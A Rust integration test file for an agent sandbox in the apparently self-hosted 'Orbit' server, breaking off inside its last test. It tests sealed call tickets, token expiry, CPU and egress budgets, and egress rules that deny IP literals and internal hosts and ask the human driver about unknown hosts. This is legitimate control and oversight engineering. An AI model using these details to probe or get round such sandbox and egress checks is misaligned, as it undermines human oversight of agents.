//! Agent sandboxes, Orbit's side (`agent::sandbox`, docs/agent-sandbox-design.md): the ticket and call token for one
//! sandbox call (who may get one), the call's end (once, token gone, CPU time counted), and egress decisions in the
//! order of section 4 (per thread and driver). Runs on SQLite, and on Postgres with `ORBIT_TEST_POSTGRES_URL`.

use std::sync::Arc;

use axum::body::{Body, to_bytes};
use axum::http::{Request, StatusCode, header};
use base64::Engine as _;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use hmac::{Hmac, Mac};
use orbit_platform::{
    AttachmentMutationCoordinator, Id, LocalBlobStore, PasswordService, Row, TestDatabase,
    TimestampMillis, UploadLimits, UploadService,
};
use orbit_server::agent::sandbox::SandboxKeys;
use orbit_server::agent::{AgentConfig, AgentState};
use orbit_server::auth_routes::CookieMode;
use orbit_server::chat_routes::ChatState;
use orbit_server::repositories::identity::{IdentityRepository, SetupRequest};
use orbit_server::task_routes::{TaskState, task_router};
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use tokio::io::AsyncWriteExt;
use tower::ServiceExt;

const SECRET: &str = "test-agent-secret-0123456789abcdef0123456789";
const KEY: &[u8] = b"test-sandbox-broker-key-0123456789abcdef";

fn hmac(key: &[u8], parts: &[&[u8]]) -> Vec<u8> {
    let mut mac = Hmac::<Sha256>::new_from_slice(key).unwrap();
    for part in parts {
        mac.update(part);
    }
    mac.finalize().into_bytes().to_vec()
}

fn service_bearer() -> String {
    let key: String = hmac(KEY, &[b"orbit-sandbox/service"])
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect();
    format!("Bearer {key}")
}

/// What the broker does with a ticket: check the MAC, then open the sealed secrets.
fn open_ticket(ticket: &str) -> (Value, Value) {
    let parts: Vec<&str> = ticket.split('.').collect();
    assert_eq!(parts.len(), 3);
    assert_eq!(parts[0], "v1");
    let mac = hmac(
        &hmac(KEY, &[b"orbit-sandbox/ticket"]),
        &[b"v1.", parts[1].as_bytes()],
    );
    assert_eq!(URL_SAFE_NO_PAD.decode(parts[2]).unwrap(), mac, "the MAC");
    let claims: Value = serde_json::from_slice(&URL_SAFE_NO_PAD.decode(parts[1]).unwrap()).unwrap();
    let sealed = URL_SAFE_NO_PAD
        .decode(claims["sealed"].as_str().unwrap())
        .unwrap();
    let (nonce, data) = sealed.split_at(16);
    let seal = hmac(KEY, &[b"orbit-sandbox/seal"]);
    let plain: Vec<u8> = data
        .chunks(32)
        .enumerate()
        .flat_map(|(index, chunk)| {
            let block = hmac(
                &seal,
                &[nonce, &u32::try_from(index).unwrap().to_be_bytes()],
            );
            chunk
                .iter()
                .zip(block)
                .map(|(a, b)| a ^ b)
                .collect::<Vec<_>>()
        })
        .collect();
    (claims, serde_json::from_slice(&plain).unwrap())
}

struct Fixture {
    _root: tempfile::TempDir,
    database: TestDatabase,
    app: axum::Router,
    agent: AgentState,
    workspace_id: String,
    conversation: String,
}

impl Fixture {
    async fn new() -> Self {
        Self::with_keys(Some(SandboxKeys::new(KEY).unwrap())).await
    }

    async fn with_keys(keys: Option<SandboxKeys>) -> Self {
        let database = TestDatabase::new().await.unwrap();
        let identity = Arc::new(IdentityRepository::new((*database).clone()));
        let now = TimestampMillis::now();
        identity
            .store_setup_token(
                "operator-secret",
                TimestampMillis::from_millis(now.as_millis() + 60_000),
            )
            .await
            .unwrap();
        let setup = identity
            .complete_setup(
                SetupRequest {
                    token: "operator-secret".to_owned(),
                    email: "owner@example.com".to_owned(),
                    display_name: "Owner".to_owned(),
                    password_hash: PasswordService::default()
                        .hash("correct horse battery")
                        .unwrap(),
                    workspace_name: "Orbit".to_owned(),
                    project_name: "General".to_owned(),
                },
                now,
            )
            .await
            .unwrap();
        let root = tempfile::tempdir().unwrap();
        let uploads = UploadService::new(
            (*database).clone(),
            Arc::new(LocalBlobStore::new(root.path().join("attachments"))),
            AttachmentMutationCoordinator::default(),
            UploadLimits::default(),
        );
        let chat = ChatState::new(Arc::clone(&identity), uploads, CookieMode::secure());
        let agent = AgentState::new(
            Some(AgentConfig {
                url: "http://127.0.0.1:9".to_owned(),
                secret: SECRET.to_owned(),
            }),
            chat,
            Arc::clone(&identity),
            CookieMode::secure(),
            Some([3; 32]),
        )
        .with_public_origin("https://orbit.example.com")
        .with_sandbox(keys);
        let app = task_router(TaskState::new(Arc::clone(&identity), CookieMode::secure()))
            .merge(orbit_server::agent::router(agent.clone()))
            .layer(axum::middleware::from_fn_with_state(
                (*database).clone(),
                orbit_server::agent::scope::layer,
            ));
        let workspace_id = setup.workspace_id.to_string();
        let conversation = sqlx::query_scalar::<_, String>(
            "SELECT id FROM chat_conversations WHERE workspace_id = $1 ORDER BY id LIMIT 1",
        )
        .bind(&workspace_id)
        .fetch_one(database.pool())
        .await
        .unwrap();
        Self {
            _root: root,
            database,
            app,
            agent,
            workspace_id,
            conversation,
        }
    }

    /// This month's use of an agent: (CPU ms, egress bytes, model tokens).
    async fn usage(&self, agent: Id) -> (i64, i64, i64) {
        sqlx::query(
            "SELECT cpu_ms, egress_bytes, model_tokens FROM agent_sandbox_usage WHERE agent_user_id = $1 AND month = $2",
        )
        .bind(agent.to_string())
        .bind(this_month())
        .fetch_optional(self.database.pool())
        .await
        .unwrap()
        .map_or((0, 0, 0), |row| {
            (row.get("cpu_ms"), row.get("egress_bytes"), row.get("model_tokens"))
        })
    }

    async fn set_usage(&self, agent: Id, month: &str, cpu_ms: i64, egress_bytes: i64, tokens: i64) {
        sqlx::query(
            "INSERT INTO agent_sandbox_usage (agent_user_id, month, cpu_ms, egress_bytes, model_tokens) \
             VALUES ($1, $2, $3, $4, $5) ON CONFLICT (agent_user_id, month) DO UPDATE SET cpu_ms = excluded.cpu_ms, \
             egress_bytes = excluded.egress_bytes, model_tokens = excluded.model_tokens",
        )
        .bind(agent.to_string())
        .bind(month)
        .bind(cpu_ms)
        .bind(egress_bytes)
        .bind(tokens)
        .execute(self.database.pool())
        .await
        .unwrap();
    }

    /// The agent's monthly limits: CPU minutes, egress bytes, model tokens.
    async fn limits(&self, agent: Id, cpu_minutes: i64, egress_bytes: i64, tokens: i64) {
        sqlx::query(
            "UPDATE agent_sandbox_settings SET cpu_minutes_month = $2, egress_bytes_month = $3, \
             model_tokens_month = $4 WHERE agent_user_id = $1",
        )
        .bind(agent.to_string())
        .bind(cpu_minutes)
        .bind(egress_bytes)
        .bind(tokens)
        .execute(self.database.pool())
        .await
        .unwrap();
    }

    /// The budget notices the agent sent: (nonce, recipients' count, one body).
    async fn notices(&self, agent: Id) -> Vec<(String, i64, String)> {
        sqlx::query(
            "SELECT nonce, COUNT(*) AS sent, MIN(body) AS body FROM chat_messages \
             WHERE author_id = $1 AND nonce LIKE 'budget:%' GROUP BY nonce ORDER BY MIN(id)",
        )
        .bind(agent.to_string())
        .fetch_all(self.database.pool())
        .await
        .unwrap()
        .into_iter()
        .map(|row| (row.get("nonce"), row.get("sent"), row.get("body")))
        .collect()
    }

    async fn call_row(&self, call: &str) -> (String, Option<String>, i64) {
        let row = sqlx::query(
            "SELECT status, interrupted, cpu_ms FROM agent_sandbox_calls WHERE id = $1",
        )
        .bind(call)
        .fetch_one(self.database.pool())
        .await
        .unwrap();
        (row.get("status"), row.get("interrupted"), row.get("cpu_ms"))
    }

    /// The sidecar's long poll, without waiting.
    async fn poll(&self) -> Value {
        let (status, value) = self
            .request(
                "GET",
                "/api/internal/agent/inputs?wait=0",
                &format!("Bearer {SECRET}"),
                None,
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{value}");
        value
    }

    async fn exec(&self, sql: &'static str, binds: &[&str]) {
        let mut query = sqlx::query(sql);
        for bind in binds {
            query = query.bind(*bind);
        }
        query.execute(self.database.pool()).await.unwrap();
    }

    async fn add_user(&self, name: &str, role: Option<&str>) -> Id {
        let id = Id::new_v7();
        let now = TimestampMillis::now().as_millis();
        sqlx::query(
            "INSERT INTO users (id, email, normalized_email, display_name, password_hash, created_at, updated_at) \
             VALUES ($1, $2, $2, $3, 'unused', $4, $4)",
        )
        .bind(id.to_string())
        .bind(format!("{name}@example.com"))
        .bind(name)
        .bind(now)
        .execute(self.database.pool())
        .await
        .unwrap();
        if let Some(role) = role {
            sqlx::query(
                "INSERT INTO memberships (id, workspace_id, user_id, role, version, created_at, updated_at) \
                 VALUES ($1, $2, $3, $4, 0, $5, $5)",
            )
            .bind(Id::new_v7().to_string())
            .bind(&self.workspace_id)
            .bind(id.to_string())
            .bind(role)
            .bind(now)
            .execute(self.database.pool())
            .await
            .unwrap();
        }
        id
    }

    /// A custom agent with `tools`, and its sandbox settings (`enabled`).
    async fn add_agent(&self, tools: &str, enabled: bool) -> Id {
        // A member of the workspace, as `profiles` makes a custom agent's bot user.
        let bot = self
            .add_user(
                &format!("bot{}", Id::new_v7().to_string().replace('-', "")),
                Some("member"),
            )
            .await;
        let now = TimestampMillis::now().as_millis();
        sqlx::query(
            "INSERT INTO agent_profiles (id, workspace_id, user_id, tools, created_at, updated_at) \
             VALUES ($1, $2, $3, $4, $5, $5)",
        )
        .bind(Id::new_v7().to_string())
        .bind(&self.workspace_id)
        .bind(bot.to_string())
        .bind(tools)
        .bind(now)
        .execute(self.database.pool())
        .await
        .unwrap();
        sqlx::query(
            "INSERT INTO agent_sandbox_settings (agent_user_id, workspace_id, enabled, updated_at) VALUES ($1, $2, $3, $4)",
        )
        .bind(bot.to_string())
        .bind(&self.workspace_id)
        .bind(i64::from(enabled))
        .bind(now)
        .execute(self.database.pool())
        .await
        .unwrap();
        bot
    }

    async fn thread(&self, agent: Id, driver: Id, status: &str) -> String {
        let key = Id::new_v7().to_string();
        sqlx::query(
            "INSERT INTO agent_threads (thread_key, workspace_id, conversation_id, status, driver_user_id, \
             updated_at, agent_user_id) VALUES ($1, $2, $3, $4, $5, $6, $7)",
        )
        .bind(&key)
        .bind(&self.workspace_id)
        .bind(&self.conversation)
        .bind(status)
        .bind(driver.to_string())
        .bind(TimestampMillis::now().as_millis())
        .bind(agent.to_string())
        .execute(self.database.pool())
        .await
        .unwrap();
        key
    }

    async fn request(
        &self,
        method: &str,
        uri: &str,
        auth: &str,
        body: Option<Value>,
    ) -> (StatusCode, Value) {
        let builder = Request::builder()
            .method(method)
            .uri(uri)
            .header(header::AUTHORIZATION, auth);
        let request = match body {
            Some(value) => builder
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(value.to_string())),
            None => builder.body(Body::empty()),
        }
        .unwrap();
        let response = self.app.clone().oneshot(request).await.unwrap();
        let status = response.status();
        let bytes = to_bytes(response.into_body(), usize::MAX).await.unwrap();
        (
            status,
            serde_json::from_slice(&bytes).unwrap_or(Value::Null),
        )
    }

    async fn issue(&self, driver: Id, agent: Id, thread: &str) -> (StatusCode, Value) {
        self.request(
            "POST",
            "/api/internal/agent/sandbox/calls",
            &format!("Bearer {SECRET}"),
            Some(json!({
                "workspace_id": self.workspace_id,
                "user_id": driver.to_string(),
                "agent_user_id": agent.to_string(),
                "thread_key": thread,
                "timeout_seconds": 120,
                "script_sha256": "a".repeat(64),
            })),
        )
        .await
    }

    /// A running call: its id, call token and proxy password.
    async fn call(&self, driver: Id, agent: Id, thread: &str) -> (String, String, String) {
        let (status, issued) = self.issue(driver, agent, thread).await;
        assert_eq!(status, StatusCode::OK, "{issued}");
        let (_, sealed) = open_ticket(issued["ticket"].as_str().unwrap());
        (
            issued["call_id"].as_str().unwrap().to_owned(),
            sealed["token"].as_str().unwrap().to_owned(),
            sealed["proxy_password"].as_str().unwrap().to_owned(),
        )
    }

    async fn end(&self, call: &str, cpu_ms: i64) -> (StatusCode, Value) {
        self.request(
            "POST",
            &format!("/api/internal/agent/sandbox/calls/{call}/end"),
            &service_bearer(),
            Some(json!({ "exit": 0, "timed_out": false, "cpu_ms": cpu_ms })),
        )
        .await
    }

    async fn check(&self, call: &str, password: &str, host: &str, port: i64) -> Value {
        let (status, value) = self
            .request(
                "POST",
                "/api/internal/agent/egress/check",
                &service_bearer(),
                Some(json!({ "call_id": call, "proxy_password": password, "host": host, "port": port })),
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{value}");
        value
    }

    async fn rule(&self, agent: Id, host: &str, port: i64, action: &str) {
        sqlx::query(
            "INSERT INTO agent_egress_rules (id, workspace_id, agent_user_id, host, port, action, created_at) \
             VALUES ($1, $2, $3, $4, $5, $6, $7)",
        )
        .bind(Id::new_v7().to_string())
        .bind(&self.workspace_id)
        .bind(agent.to_string())
        .bind(host)
        .bind(port)
        .bind(action)
        .bind(TimestampMillis::now().as_millis())
        .execute(self.database.pool())
        .await
        .unwrap();
    }

    /// The driver's answer to a pending request (the card buttons come in a later phase).
    async fn answer(&self, request_id: &str, status: &str) {
        sqlx::query(
            "UPDATE agent_egress_requests SET status = $2, decided_at = $3, expires_at = $4 WHERE id = $1",
        )
        .bind(request_id)
        .bind(status)
        .bind(TimestampMillis::now().as_millis())
        .bind(TimestampMillis::now().as_millis() + 30 * 60 * 1000)
        .execute(self.database.pool())
        .await
        .unwrap();
    }

    /// A person's session token (a normal bearer, as the apps use).
    async fn session(&self, user: Id) -> String {
        let token = orbit_platform::generate_opaque_token();
        let hash: [u8; 32] = Sha256::digest(token.as_bytes()).into();
        let now = TimestampMillis::now().as_millis();
        sqlx::query(
            "INSERT INTO sessions (id, token_hash, user_id, created_at, last_activity_at, idle_expires_at, \
             absolute_expires_at) VALUES ($1, $2, $3, $4, $4, $5, $5)",
        )
        .bind(Id::new_v7().to_string())
        .bind(hash.to_vec())
        .bind(user.to_string())
        .bind(now)
        .bind(now + 3_600_000)
        .execute(self.database.pool())
        .await
        .unwrap();
        token
    }

    async fn owner(&self) -> Id {
        sqlx::query_scalar::<_, String>(
            "SELECT user_id FROM memberships WHERE workspace_id = $1 AND role = 'owner'",
        )
        .bind(&self.workspace_id)
        .fetch_one(self.database.pool())
        .await
        .unwrap()
        .parse()
        .unwrap()
    }

    /// A person's answer on the egress card's route.
    async fn card(&self, token: &str, request: &str, answer: Value) -> (StatusCode, Value) {
        self.request(
            "POST",
            &format!(
                "/api/v1/workspaces/{}/agents/egress-requests/{request}",
                self.workspace_id
            ),
            &format!("Bearer {token}"),
            Some(answer),
        )
        .await
    }

    /// The continuation inputs of a thread: (author, action).
    async fn continuations(&self, thread: &str) -> Vec<(String, Value)> {
        sqlx::query(
            "SELECT author_id, action FROM agent_inputs WHERE thread_key = $1 AND kind = 'action' \
             ORDER BY message_id",
        )
        .bind(thread)
        .fetch_all(self.database.pool())
        .await
        .unwrap()
        .into_iter()
        .map(|row| {
            (
                row.get::<String, _>("author_id"),
                serde_json::from_str(&row.get::<String, _>("action")).unwrap(),
            )
        })
        .collect()
    }

    async fn tasks_with(&self, token: &str) -> StatusCode {
        self.request(
            "GET",
            &format!("/api/v1/workspaces/{}/tasks", self.workspace_id),
            &format!("Bearer {token}"),
            None,
        )
        .await
        .0
    }
}

const TOOLS: &str = r#"["search_tasks", "sandbox_shell"]"#;

fn this_month() -> String {
    jiff::Timestamp::now().strftime("%Y-%m").to_string()
}

fn last_month() -> String {
    let today = jiff::Timestamp::now()
        .to_zoned(jiff::tz::TimeZone::UTC)
        .date();
    today
        .first_of_month()
        .checked_sub(jiff::Span::new().days(1))
        .unwrap()
        .strftime("%Y-%m")
        .to_string()
}

#[tokio::test]
async fn a_ticket_carries_a_sealed_call_token_that_dies_at_the_call_end() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;

    let (status, issued) = fixture.issue(driver, agent, &thread).await;
    assert_eq!(status, StatusCode::OK, "{issued}");
    let ticket = issued["ticket"].as_str().unwrap();
    let (claims, sealed) = open_ticket(ticket);
    assert_eq!(claims["call"], issued["call_id"]);
    assert_eq!(claims["agent"], agent.to_string());
    assert_eq!(claims["limits"]["timeout_s"], 120);
    assert_eq!(claims["limits"]["idle_minutes"], 30);
    let work = claims["work"].as_str().unwrap();
    assert!(work.len() == 32 && work.bytes().all(|b| b.is_ascii_hexdigit()));
    // The sidecar sees neither the token nor the proxy password; Orbit keeps only hashes.
    let token = sealed["token"].as_str().unwrap();
    let password = sealed["proxy_password"].as_str().unwrap();
    assert!(token.starts_with("orbit-agent."));
    assert!(!issued.to_string().contains(token) && !issued.to_string().contains(password));
    let stored = sqlx::query(
        "SELECT proxy_password_hash, status, work_id FROM agent_sandbox_calls WHERE id = $1",
    )
    .bind(issued["call_id"].as_str().unwrap())
    .fetch_one(fixture.database.pool())
    .await
    .unwrap();
    assert_eq!(
        stored.get::<Vec<u8>, _>("proxy_password_hash"),
        Sha256::digest(password.as_bytes()).to_vec()
    );
    assert_eq!(stored.get::<String, _>("work_id"), work);

    // The same thread and driver keep their sandbox; another driver or thread gets another.
    let (_, again) = fixture.issue(driver, agent, &thread).await;
    assert_eq!(
        open_ticket(again["ticket"].as_str().unwrap()).0["work"],
        work
    );
    let other_thread = fixture.thread(agent, driver, "running").await;
    let (_, other) = fixture.issue(driver, agent, &other_thread).await;
    assert_ne!(
        open_ticket(other["ticket"].as_str().unwrap()).0["work"],
        work
    );

    // The token acts as the driver within the agent's tools, until the call ends.
    assert_eq!(fixture.tasks_with(token).await, StatusCode::OK);
    let (status, ended) = fixture.end(issued["call_id"].as_str().unwrap(), 1500).await;
    assert_eq!(status, StatusCode::OK, "{ended}");
    assert_eq!(fixture.tasks_with(token).await, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn only_the_driver_of_a_running_thread_gets_a_ticket_for_an_agent_with_the_sandbox_on() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let other = fixture.add_user("other", Some("admin")).await;
    let guest = fixture.add_user("guest", Some("guest")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;

    // The sidecar secret is needed.
    let (status, _) = fixture
        .request(
            "POST",
            "/api/internal/agent/sandbox/calls",
            "Bearer wrong",
            Some(json!({
                "workspace_id": fixture.workspace_id,
                "user_id": driver.to_string(),
                "agent_user_id": agent.to_string(),
                "thread_key": thread,
            })),
        )
        .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let refused = |value: &Value, code: &str| assert_eq!(value["code"], code, "{value}");

    // Another person (even an admin) cannot get a ticket for the driver's thread.
    let (status, value) = fixture.issue(other, agent, &thread).await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    refused(&value, "sandbox_refused");
    // A thread that is not running; another agent's thread; a guest's thread.
    let idle = fixture.thread(agent, driver, "idle").await;
    refused(
        &fixture.issue(driver, agent, &idle).await.1,
        "sandbox_refused",
    );
    let second = fixture.add_agent(TOOLS, true).await;
    refused(
        &fixture.issue(driver, second, &thread).await.1,
        "sandbox_refused",
    );
    let guests = fixture.thread(agent, guest, "running").await;
    refused(
        &fixture.issue(guest, agent, &guests).await.1,
        "sandbox_refused",
    );
    // An agent without the tool, or with the sandbox off.
    let untick = fixture.add_agent(r#"["search_tasks"]"#, true).await;
    let thread_untick = fixture.thread(untick, driver, "running").await;
    refused(
        &fixture.issue(driver, untick, &thread_untick).await.1,
        "sandbox_refused",
    );
    let off = fixture.add_agent(TOOLS, false).await;
    let thread_off = fixture.thread(off, driver, "running").await;
    refused(
        &fixture.issue(driver, off, &thread_off).await.1,
        "sandbox_off",
    );

    // The month's CPU budget spent.
    let month = jiff::Timestamp::now().strftime("%Y-%m").to_string();
    sqlx::query(
        "INSERT INTO agent_sandbox_usage (agent_user_id, month, cpu_ms) VALUES ($1, $2, $3)",
    )
    .bind(agent.to_string())
    .bind(&month)
    .bind(600_i64 * 60_000)
    .execute(fixture.database.pool())
    .await
    .unwrap();
    refused(
        &fixture.issue(driver, agent, &thread).await.1,
        "sandbox_budget_spent",
    );
    fixture
        .exec(
            "DELETE FROM agent_sandbox_usage WHERE agent_user_id = $1",
            &[&agent.to_string()],
        )
        .await;
    assert_eq!(
        fixture.issue(driver, agent, &thread).await.0,
        StatusCode::OK
    );

    // A suspended driver, and a deleted agent.
    fixture
        .exec(
            "UPDATE users SET suspended_at = 1 WHERE id = $1",
            &[&driver.to_string()],
        )
        .await;
    refused(
        &fixture.issue(driver, agent, &thread).await.1,
        "sandbox_refused",
    );
    fixture
        .exec(
            "UPDATE users SET suspended_at = NULL WHERE id = $1",
            &[&driver.to_string()],
        )
        .await;
    fixture
        .exec(
            "UPDATE agent_profiles SET deleted_at = 1 WHERE user_id = $1",
            &[&agent.to_string()],
        )
        .await;
    refused(
        &fixture.issue(driver, agent, &thread).await.1,
        "sandbox_refused",
    );
}

#[tokio::test]
async fn without_the_broker_key_the_sandbox_is_off() {
    let fixture = Fixture::with_keys(None).await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (status, value) = fixture.issue(driver, agent, &thread).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    assert_eq!(value["code"], "sandbox_off");
    // The sidecar learns it with its inputs, and stops every thread sandbox.
    assert_eq!(fixture.poll().await["agent_sandbox"], false);
}

#[tokio::test]
async fn a_call_ends_once_even_when_ends_race_and_its_cpu_time_counts_once() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, _, _) = fixture.call(driver, agent, &thread).await;

    // The broker's key (the sidecar's secret only ends a call as interrupted: its own test).
    let (status, _) = fixture
        .request(
            "POST",
            &format!("/api/internal/agent/sandbox/calls/{call}/end"),
            "Bearer wrong",
            Some(json!({ "cpu_ms": 1 })),
        )
        .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let ends = (0..6).map(|_| fixture.end(&call, 2_000));
    for (status, value) in futures_util::future::join_all(ends).await {
        assert_eq!(status, StatusCode::OK, "{value}");
    }
    let used: i64 =
        sqlx::query_scalar("SELECT cpu_ms FROM agent_sandbox_usage WHERE agent_user_id = $1")
            .bind(agent.to_string())
            .fetch_one(fixture.database.pool())
            .await
            .unwrap();
    assert_eq!(used, 2_000);
    let row = sqlx::query("SELECT status, session_id FROM agent_sandbox_calls WHERE id = $1")
        .bind(&call)
        .fetch_one(fixture.database.pool())
        .await
        .unwrap();
    assert_eq!(row.get::<String, _>("status"), "done");
    assert_eq!(row.get::<Option<String>, _>("session_id"), None);
    assert_eq!(
        fixture.end(&Id::new_v7().to_string(), 1).await.0,
        StatusCode::NOT_FOUND
    );
}

#[tokio::test]
async fn a_call_without_an_end_becomes_lost_and_its_token_dies() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, token, _) = fixture.call(driver, agent, &thread).await;
    assert_eq!(fixture.tasks_with(&token).await, StatusCode::OK);
    // Started long ago: past its 120 s timeout and the 5 minutes of grace.
    sqlx::query("UPDATE agent_sandbox_calls SET started_at = $2 WHERE id = $1")
        .bind(&call)
        .bind(TimestampMillis::now().as_millis() - 8 * 60 * 1000)
        .execute(fixture.database.pool())
        .await
        .unwrap();
    fixture.call(driver, agent, &thread).await;
    let status: String = sqlx::query_scalar("SELECT status FROM agent_sandbox_calls WHERE id = $1")
        .bind(&call)
        .fetch_one(fixture.database.pool())
        .await
        .unwrap();
    assert_eq!(status, "lost");
    assert_eq!(fixture.tasks_with(&token).await, StatusCode::UNAUTHORIZED);
    // A late end of the broker keeps the call lost, but its CPU time counts, once.
    assert_eq!(fixture.end(&call, 9_999).await.0, StatusCode::OK);
    assert_eq!(fixture.end(&call, 9_999).await.0, StatusCode::OK);
    assert_eq!(
        fixture.call_row(&call).await,
        ("lost".to_owned(), None, 9_999)
    );
    assert_eq!(fixture.usage(agent).await.0, 9_999);
}

#[tokio::test]
async fn egress_decisions_follow_the_order_and_stay_in_their_thread_and_driver() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let teammate = fixture.add_user("teammate", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, _, password) = fixture.call(driver, agent, &thread).await;
    let decide = |host: &'static str, port: i64| {
        let (call, password) = (call.clone(), password.clone());
        let fixture = &fixture;
        async move { fixture.check(&call, &password, host, port).await }
    };

    // Only the proxy, and only with the call's password.
    let (status, _) = fixture
        .request(
            "POST",
            "/api/internal/agent/egress/check",
            &format!("Bearer {SECRET}"),
            Some(json!({ "call_id": call, "proxy_password": password, "host": "a.example.com", "port": 443 })),
        )
        .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = fixture
        .request(
            "POST",
            "/api/internal/agent/egress/check",
            &service_bearer(),
            Some(json!({ "call_id": call, "proxy_password": "wrong", "host": "a.example.com", "port": 443 })),
        )
        .await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    // No rule: ask, one pending request however often it is asked.
    let first = decide("API.Other.NET.", 443).await;
    assert_eq!(first["decision"], "ask");
    assert_eq!(first["host"], "api.other.net");
    assert_eq!(
        decide("api.other.net", 443).await["request_id"],
        first["request_id"]
    );
    // Never: IP literals, Orbit's own host, orbit.internal, odd ports.
    for host in ["1.1.1.1", "[::1]", "orbit.example.com", "orbit.internal"] {
        assert_eq!(decide(host, 443).await["decision"], "deny", "{host}");
    }
    assert_eq!(decide("api.other.net", 70_000).await["decision"], "deny");

    // Rules: a wildcard covers subdomains only, and only its port; deny beats allow.
    fixture.rule(agent, "*.example.com", 443, "allow").await;
    assert_eq!(decide("a.b.example.com", 443).await["decision"], "allow");
    assert_eq!(decide("example.com", 443).await["decision"], "ask");
    assert_eq!(decide("a.example.com", 8443).await["decision"], "ask");
    fixture.rule(agent, "bad.example.com", 443, "deny").await;
    assert_eq!(decide("bad.example.com", 443).await["decision"], "deny");
    // A risky host asks even under an allow rule; Allow once (this thread, this driver) lets it through.
    fixture
        .rule(agent, "*.s3.amazonaws.com", 443, "allow")
        .await;
    let risky = decide("bucket.s3.amazonaws.com", 443).await;
    assert_eq!(risky["decision"], "ask");
    fixture
        .answer(risky["request_id"].as_str().unwrap(), "allowed")
        .await;
    assert_eq!(
        decide("bucket.s3.amazonaws.com", 443).await["decision"],
        "allow"
    );

    // Allow once in this thread does not reach another thread of the same driver, nor another driver.
    fixture
        .answer(first["request_id"].as_str().unwrap(), "allowed")
        .await;
    assert_eq!(decide("api.other.net", 443).await["decision"], "allow");
    let other_thread = fixture.thread(agent, driver, "running").await;
    let (other_call, _, other_password) = fixture.call(driver, agent, &other_thread).await;
    assert_eq!(
        fixture
            .check(&other_call, &other_password, "api.other.net", 443)
            .await["decision"],
        "ask"
    );
    let theirs = fixture.thread(agent, teammate, "running").await;
    let (their_call, _, their_password) = fixture.call(teammate, agent, &theirs).await;
    let asked = fixture
        .check(&their_call, &their_password, "api.other.net", 443)
        .await;
    assert_eq!(asked["decision"], "ask");
    // A Deny holds for its thread and driver.
    fixture
        .answer(asked["request_id"].as_str().unwrap(), "denied")
        .await;
    assert_eq!(
        fixture
            .check(&their_call, &their_password, "api.other.net", 443)
            .await["decision"],
        "deny"
    );

    // The pending requests come back with the call's end; after the end the call gets nothing.
    let (_, ended) = fixture.end(&other_call, 10).await;
    let pending = ended["egress_pending"].as_array().unwrap();
    assert_eq!(pending.len(), 1);
    assert_eq!(pending[0]["host"], "api.other.net");
    assert_eq!(
        fixture
            .check(&other_call, &other_password, "api.other.net", 443)
            .await["decision"],
        "deny"
    );

    // Off, or the budget spent: deny, also for allowed hosts.
    let month = jiff::Timestamp::now().strftime("%Y-%m").to_string();
    sqlx::query(
        "INSERT INTO agent_sandbox_usage (agent_user_id, month, egress_bytes) VALUES ($1, $2, $3) \
         ON CONFLICT (agent_user_id, month) DO UPDATE SET egress_bytes = $3",
    )
    .bind(agent.to_string())
    .bind(&month)
    .bind(2_147_483_648_i64)
    .execute(fixture.database.pool())
    .await
    .unwrap();
    assert_eq!(decide("a.b.example.com", 443).await["decision"], "deny");
    fixture
        .exec(
            "DELETE FROM agent_sandbox_usage WHERE agent_user_id = $1",
            &[&agent.to_string()],
        )
        .await;
    fixture
        .exec(
            "UPDATE agent_sandbox_settings SET enabled = 0 WHERE agent_user_id = $1",
            &[&agent.to_string()],
        )
        .await;
    assert_eq!(decide("a.b.example.com", 443).await["decision"], "deny");

    // Every decision is logged: host and port only.
    let logged: Vec<(String, String)> =
        sqlx::query("SELECT host, decision FROM agent_egress_log WHERE call_id = $1 ORDER BY id")
            .bind(&call)
            .fetch_all(fixture.database.pool())
            .await
            .unwrap()
            .iter()
            .map(|row| (row.get("host"), row.get("decision")))
            .collect();
    assert!(logged.contains(&("api.other.net".to_owned(), "ask".to_owned())));
    assert!(logged.contains(&("bucket.s3.amazonaws.com".to_owned(), "allow".to_owned())));
    assert!(logged.contains(&("1.1.1.1".to_owned(), "deny".to_owned())));
    assert!(logged.len() >= 15);
}

// ---------------------------------------------------------------------------------------------
// The egress proxy (`agent::egress_proxy`) against these routes on a real port.

#[tokio::test]
async fn the_card_answer_follows_who_may_click_and_the_run_goes_on_as_the_driver() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let teammate = fixture.add_user("teammate", Some("member")).await;
    let guest = fixture.add_user("guest", Some("guest")).await;
    let admin = fixture.add_user("admin", Some("admin")).await;
    let owner = fixture.owner().await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, token, password) = fixture.call(driver, agent, &thread).await;
    let asked = fixture
        .check(&call, &password, "api.example.org", 443)
        .await;
    assert_eq!(asked["decision"], "ask");
